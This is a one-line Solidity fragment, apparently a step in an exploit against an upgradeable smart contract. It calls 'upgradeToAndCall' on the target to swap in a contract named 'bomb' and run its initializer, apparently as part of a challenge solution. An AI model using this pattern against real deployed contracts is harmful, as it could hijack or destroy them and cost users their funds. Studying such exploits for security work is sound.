(bool success, bytes memory data) =  address(originalContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(bomb), abi.encodeWithSignature("initialize()")));
